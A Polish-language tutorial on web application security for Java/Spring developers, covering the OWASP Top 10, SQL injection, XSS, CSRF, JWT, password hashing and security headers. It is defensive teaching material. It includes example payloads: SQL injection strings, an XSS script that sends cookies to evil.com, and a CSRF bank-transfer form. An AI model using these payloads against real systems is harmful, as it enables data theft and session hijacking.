01 — klasyfikacja zagrożeń
OWASP Top 10

Open Web Application Security Project — lista 10 najgroźniejszych kategorii zagrożeń aplikacji webowych. Aktualizowana co kilka lat przez społeczność security.

A01
Broken Access Control
// nieuprawniony dostęp do zasobów
User może wykonać akcje lub zobaczyć dane do których nie ma uprawnień. Np. zmiana ID w URL daje dostęp do cudzych danych.
✅ Weryfikuj uprawnienia po stronie serwera przy każdym żądaniu. Sprawdź czy zasób należy do zalogowanego usera.
A02
Cryptographic Failures
// słabe lub brak szyfrowania
Dane wrażliwe przechowywane bez szyfrowania. MD5/SHA1 do haseł — za szybkie, łatwe do złamania.
✅ HTTPS wszędzie. bcrypt/Argon2 do haseł. Szyfruj dane wrażliwe w bazie. TLS 1.2+.
A03
Injection
// SQL, NoSQL, OS, LDAP
Niezaufane dane trafiają do interpretera jako kod. SQL injection pozwala czytać/modyfikować całą bazę danych.
✅ Prepared statements. Walidacja inputu. ORM (Hibernate). Whitelist zamiast blacklist.
A04
Insecure Design
// błędy w architekturze
Security jako "afterthought". Logika biznesowa z lukami — np. można kupić produkt za 0 zł manipulując requestem.
⚠️ Security by Design. Threat modeling. Walidacja po stronie serwera — nie ufaj klientowi nigdy.
A05
Security Misconfiguration
// błędna konfiguracja serwera
Domyślne hasła, niepotrzebne porty otwarte, stack traces w response, verbose errors na produkcji, debug mode włączony.
✅ Zamknij wszystko czego nie używasz. Zmień domyślne hasła. Ukryj stack traces w response.
A06
Vulnerable Components
// stare biblioteki z CVE
Używasz bibliotek z known CVE. Log4Shell był w Log4j — bibliotece używanej w tysiącach aplikacji.
✅ Dependabot / Snyk do automatycznych alertów. Regularne aktualizacje. mvn dependency-check.
A07
Broken Authentication
// słabe uwierzytelnianie
Brak rate limitingu (brute force), słabe hasła, session token w URL, brak invalidacji tokenu po wylogowaniu.
✅ Rate limiting + account lockout. MFA. Krótki TTL tokenów. Blacklista JWT po wylogowaniu.
A08
Software Integrity Failures
// niezaufany kod w pipeline
Biblioteki z niezaufanych źródeł. Brak weryfikacji podpisu paczek. Supply chain attack przez podatny CI/CD.
⚠️ Lockfile w repo. Pinuj wersje. Weryfikuj checksums. Tylko trusted registries.
A09
Logging & Monitoring Failures
// brak logów i alertów
Ataki nie wykrywane bo brak logowania. Średni czas wykrycia włamania — 280 dni. Brak alertów na anomalie.
✅ Loguj każdą próbę logowania. Alerty przy anomaliach. Centralne logi (ELK Stack, Grafana Loki).
A10
SSRF
// Server-Side Request Forgery
Aplikacja pobiera URL od usera — atakujący podaje wewnętrzny URL (http://localhost/admin) i dostaje sieć wewnętrzną.
✅ Whitelist domen. Blokuj prywatne IP (10.x, 192.168.x). Nie pobieraj URL od usera bezpośrednio.
02 — atak nr 1
SQL Injection

Najstarszy i nadal jeden z najgroźniejszych ataków. Atakujący wstrzykuje SQL przez niezabezpieczone pole formularza. Może czytać, modyfikować lub usunąć całą bazę.

// ATAK
Pole login: admin' OR '1'='1
Pole hasło: cokolwiek

Wynikowe zapytanie:
WHERE login='admin'
OR '1'='1'
AND pass='cokolwiek'

'1'='1' = zawsze true →
wszystkich userów!
// OBRONA
Prepared statement:
SELECT * FROM users
WHERE login = ?
AND pass = ?

Parametry auto-escape.
' staje się \' →
traktowany jako tekst,
nie kod SQL.
typy SQL injection
// 1. CLASSIC — wynik widoczny od razu
GET /users?id=1 OR 1=1--
// Zwraca wszystkich userów!

// 2. BLIND — zachowanie się zmienia
id=1 AND SLEEP(5)--
// Odpowiedź po 5s → podatny!

// 3. UNION — wyciągnięcie innych tabel
id=1 UNION SELECT username,password FROM admin--

// 4. DROP TABLE — destrukcja
name='; DROP TABLE users;--
obrona — Java (JDBC, JPA, Spring)
// ❌ PODATNE — konkatenacja stringa
String sql = "SELECT * FROM users WHERE email = '"
           + email + "'";

// ✅ BEZPIECZNE — PreparedStatement
String sql = "SELECT * FROM users WHERE email = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, email); // auto-escape!

// ✅ JPA / Spring Data — domyślnie bezpieczne
userRepository.findByEmail(email);

// ✅ JPQL z parametrami
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// ❌ JPQL też można popsuć!
@Query("SELECT u FROM User u WHERE u.email = '" + email + "'")

// ✅ Walidacja inputu jako dodatkowa warstwa
if (!email.matches("^[\\w.+-]+@[\\w-]+\\.[\\w.]+$")) {
  throw new ValidationException("Invalid email");
}
03 — wstrzykiwanie skryptów
XSS — Cross-Site Scripting

Atakujący wstrzykuje złośliwy JavaScript do strony. Przeglądarka innego użytkownika go wykonuje — kradzież sesji, keylogger, redirect na phishing.

💀 3 typy XSS
TypJak działaPrzykład
Reflected Payload w URL, serwer echo'uje w response. Wymaga kliknięcia linku. ?q=<script>alert(1)</script>
Stored Payload zapisany w bazie (komentarz). Uruchamia się dla każdego kto odwiedzi stronę. Najgroźniejszy! Komentarz: <script>steal()</script>
DOM-based JS po stronie klienta wstawia dane do DOM bez sanityzacji. innerHTML = location.hash
// KRADZIEŻ SESJI
Imię w formularzu:
<script>
fetch('evil.com?c='+
document.cookie)
</script>

Każdy kto widzi imię
→ cookie leci do evil.com
// OCHRONA
1. HttpOnly cookie →
JS nie ma dostępu

2. Escape output →
< → &lt;
Tekst, nie kod JS

3. CSP Header →
blokuje inline scripts
obrona przed XSS
// ❌ PODATNE — surowy HTML
element.innerHTML = userInput;
document.write(userInput);

// ✅ BEZPIECZNE — textContent
element.textContent = userInput;

// ✅ Thymeleaf — domyślnie escape'uje
<p th:text="${userInput}"></p>
// <script> → &lt;script&gt; automatycznie

// ❌ Thymeleaf unescape — tylko zaufany HTML!
<p th:utext="${content}"></p>

// ✅ OWASP Java Encoder

String safe = Encode.forHtml(userInput);
String safeJs = Encode.forJavaScript(userInput);

// ✅ Content Security Policy — Spring Security
http.headers(h -> h
  .contentSecurityPolicy(c -> c
    .policyDirectives(
      "default-src 'self'; " +
      "script-src 'self'; " +
      "frame-ancestors 'none'"
    )
  )
);
04 — fałszywe żądania
CSRF — Cross-Site Request Forgery

Złośliwa strona wykonuje akcje w imieniu zalogowanego użytkownika. Przeglądarka automatycznie dołącza cookies — serwer myśli że to prawdziwy user.

SCENARIUSZ ATAKU: 1. User jest zalogowany na bank.pl (ma ważne session cookie) 2. User odwiedza evil.com 3. evil.com ma ukryty formularz: <form action="https://bank.pl/transfer" method="POST"> <input name="amount" value="10000"> <input name="to" value="hacker123"> </form> <script>document.forms[0].submit()</script> 4. Przeglądarka wysyła POST do bank.pl automatycznie dołączając cookies! 5. bank.pl widzi ważne cookie → myśli że to user → przelew wykonany! SameSite=Lax + CSRF token = ochrona
ochrona przed CSRF — Spring Security
// ✅ METODA 1: SameSite cookie
server:
  servlet.session.cookie:
    same-site: lax
    http-only: true
    secure:    true

// SameSite=Lax: blokuje cross-site POST
// SameSite=Strict: blokuje wszystkie cross-site

// ✅ METODA 2: CSRF Token (Spring MVC)
http.csrf(Customizer.withDefaults());

// Thymeleaf dodaje token automatycznie:
<form method="post" action="/transfer">
  <input type="hidden"
    th:name="${_csrf.parameterName}"
    th:value="${_csrf.token}">
</form>

// REST API + JWT: wyłącz CSRF
// (JWT w nagłówku Auth, nie w cookie)
http.csrf(c -> c.disable());

// ✅ METODA 3: Sprawdź Origin header
String origin = request.getHeader("Origin");
if (!"https://mojadomena.pl".equals(origin)) {
  throw new SecurityException("Invalid origin");
}
05 — tożsamość i tokeny
Auth, JWT & Sesje

Uwierzytelnianie to bramka do całej aplikacji. Jeden błąd tutaj i atakujący ma dostęp do wszystkiego.

JWT — co może pójść nie tak
// ❌ BŁĄD 1: Algorytm "none"
// Stare biblioteki akceptowały alg:none!
{"alg":"none"}.{"role":"ADMIN"}.
// FIX: zawsze verifyWith + fixedAlgorithm
Jwts.parser().verifyWith(secretKey).build();

// ❌ BŁĄD 2: Zbyt długi exp
exp: 2099-01-01  // "wieczny" token!
exp: now + 15min // access token
exp: now + 7d    // refresh token

// ❌ BŁĄD 3: Dane wrażliwe w payload
{"userId":1, "password":"secret123"}
// Payload = base64, każdy może odczytać!
{"userId":1, "role":"USER"}  // tylko publiczne

// ❌ BŁĄD 4: Słaby secret
secretKey = "secret"  // za krótki!
secretKey = Keys.secretKeyFor(HS256);
// Minimum 256 bitów (32 bajty)

// ✅ Kompletna weryfikacja
try {
  Claims c = Jwts.parser()
    .verifyWith(secretKey).build()
    .parseSignedClaims(token).getPayload();
  if (!"myapp.com".equals(c.getIssuer()))
    throw new SecurityException();
} catch (JwtException e) {
  throw new UnauthorizedException();
}
⚠️ Access Token vs Refresh Token
ACCESS TOKEN Krótki TTL: 15 minut – 1 godzina Wysyłany w każdym żądaniu API Nagłówek: Authorization: Bearer ... Jeśli ukradziony → wygasa szybko REFRESH TOKEN Długi TTL: 7–30 dni Przechowywany w HttpOnly cookie Używany TYLKO do odświeżania Jeśli ukradziony → unieważnij w bazie FLOW: Login → oba tokeny Access wygasa → wyślij refresh token Serwer weryfikuje → nowy access token Wylogowanie → usuń refresh z bazy
rate limiting — brute force protection
// Spring Boot — Bucket4j
@PostMapping("/login")
public ResponseEntity login(
    @RequestBody LoginRequest req,
    HttpServletRequest http) {

  String ip = http.getRemoteAddr();

  // Max 5 prób na minutę per IP
  Bucket bucket = buckets.computeIfAbsent(
    ip, k -> Bucket.builder()
      .addLimit(Bandwidth.classic(
        5, Refill.intervally(
          5, Duration.ofMinutes(1))
      )).build()
  );

  if (!bucket.tryConsume(1)) {
    return ResponseEntity
      .status(429)
      .body("Too many attempts.");
  }
  // reszta logiki logowania...
}
06 — kryptografia haseł
Hashowanie haseł

Hasła nigdy nie mogą być przechowywane jawnie ani zaszyfrowane. Tylko jednokierunkowy hash z solą. bcrypt, Argon2 — nie MD5, nie SHA1, nie SHA256.

// ŹLE
MD5("haslo123")
= 482c811da5d5b4bc...

Rainbow tables →
złamane w sekundy

GPU: 8 miliardów
SHA1/sekundę →
słowniki w minuty
// DOBRZE
bcrypt("haslo123",12)
= $2a$12$R9h/cIPz...

Zawiera sól (losowy)
Celowo wolny (cost)
cost=12 → ~300ms

GPU: tylko 200
bcrypt/sekundę!
NIGDY nie używaj MD5/SHA1/SHA256 do haseł! Są za szybkie — GPU łamie miliardy SHA256/sekundę. bcrypt/Argon2 są celowo wolne. Ze skradzioną bazą danych atakujący złamie MD5 w godziny. bcrypt cost=12 — lata.
bcrypt i Argon2 w Spring Boot
// Konfiguracja — BCrypt
@Bean
public PasswordEncoder passwordEncoder() {
  // cost=10 szybki, 12 produkcja, 14 paranoja
  // rośnie wykładniczo: 12=4×wolniejszy niż 10
  return new BCryptPasswordEncoder(12);
}

// Argon2 — nowszy, zalecany przez OWASP
@Bean
public PasswordEncoder passwordEncoder() {
  return Argon2PasswordEncoder
    .defaultsForSpringSecurity_v5_8();
}

// Rejestracja — zawsze hash przed zapisem!
public User register(String email, String raw) {
  String hashed = encoder.encode(raw);
  return repo.save(new User(email, hashed));
}

// Weryfikacja przy logowaniu
public boolean login(String email, String raw) {
  User user = repo.findByEmail(email).orElseThrow();
  // matches() hashuje raw i porównuje
  return encoder.matches(raw, user.getPassword());
  // NIGDY nie porównuj hasha przez equals()!
}

// Walidacja siły hasła
if (pass.length() < 12)
  throw new ValidationException("Min 12 znaków");
if (!pass.matches(".*[A-Z].*"))
  throw new ValidationException("Min 1 duża litera");
if (!pass.matches(".*[0-9].*"))

07 — nagłówki HTTP
Security Headers

Nagłówki HTTP które mówią przeglądarce jak ma się zachować. Darmowa, łatwa linia obrony — wiele ataków można zablokować samymi nagłówkami.

🛡️ Najważniejsze security headers
NagłówekCo blokuje
Content-Security-Policy Whitelist skąd mogą pochodzić skrypty, style, obrazki. Główna obrona przed XSS.
Strict-Transport-Security Wymusza HTTPS zawsze. Przeglądarka nigdy nie użyje HTTP dla tej domeny.
X-Frame-Options Blokuje umieszczenie strony w iframe — obrona przed clickjacking.
X-Content-Type-Options Blokuje MIME sniffing. Przeglądarka musi ufać Content-Type.
Referrer-Policy Kontroluje ile informacji idzie w Referer. Użyj: strict-origin-when-cross-origin.
Permissions-Policy Wyłącza nieużywane API (kamera, mikrofon, geolocation).
Spring Security + Nginx
// Spring Security — headers config
http.headers(h -> h
  // HSTS — 1 rok + subdomeny
  .httpStrictTransportSecurity(s -> s
    .maxAgeInSeconds(31536000)
    .includeSubDomains(true)
    .preload(true)
  )
  .frameOptions(f -> f.deny())
  .contentTypeOptions(Customizer.withDefaults())
  .contentSecurityPolicy(c -> c
    .policyDirectives(
      "default-src 'self'; " +
      "script-src 'self'; " +
      "style-src 'self' 'unsafe-inline'; " +
      "frame-ancestors 'none'"
    )
  )
);

# Nginx — dodaj do server {}
add_header Strict-Transport-Security
  "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy
  "strict-origin-when-cross-origin" always;
add_header Permissions-Policy
  "geolocation=(), camera=(), microphone=()";

# Ukryj wersję serwera
server_tokens off;
# Nie zdradza już: "nginx/1.24.0"
08 — przed deploymentem
Security Checklist

Każda aplikacja przed wyjściem na produkcję powinna przejść przez tę listę. Bezpieczeństwo to nie feature — to fundament.

💀 Krytyczne — bez tego NIE deployujesz
☐ Prepared statements wszędzie (zero SQL injection)
☐ bcrypt/Argon2 do haseł (nie MD5/SHA1!)
☐ HTTPS na produkcji z ważnym certyfikatem
☐ Żadnych sekretów w kodzie ani repozytorium Git
☐ Walidacja inputu po stronie serwera
☐ Baza danych tylko na 127.0.0.1
☐ Domyślne hasła zmienione (admin/admin → NIE!)
☐ Stack traces ukryte przed klientem
⚠️ Ważne — auth i nagłówki
☐ Content-Security-Policy header ustawiony
☐ HSTS header włączony
☐ X-Frame-Options: DENY
☐ Cookies: HttpOnly + Secure + SameSite=Lax
☐ Rate limiting na endpoint logowania
☐ JWT krótki TTL (access <1h, refresh <30d)
☐ Autoryzacja przy każdym endpoincie
☐ CORS — konkretna domena (nie *)
✅ Monitoring i audyt
☐ Loguj każdą próbę logowania (sukces + fail)
☐ Loguj każdą zmianę uprawnień
☐ Alerty przy anomaliach (100 failów/minutę)
☐ Dependabot / Snyk (CVE w bibliotekach)
☐ Regularne aktualizacje zależności
☐ Testy bezpieczeństwa w CI (SAST/DAST)
☐ Kontener NIE działa jako root
☐ Zasada najmniejszych uprawnień (DB user)
Złota zasada: Security by Design, nie Security by Afterthought Dodanie zabezpieczeń po napisaniu aplikacji jest 10× droższe niż zaprojektowanie ich od początku. Przy każdej nowej funkcji pytaj: "Jak atakujący mógłby to wykorzystać?"
Narzędzia warte poznania: OWASP ZAP — skaner bezpieczeństwa web apps. Burp Suite — proxy do testów penetracyjnych. Snyk / Dependabot — CVE w zależnościach. SonarQube — statyczna analiza kodu (SAST). Have I Been Pwned API — sprawdź czy hasło jest na liście wycieków.
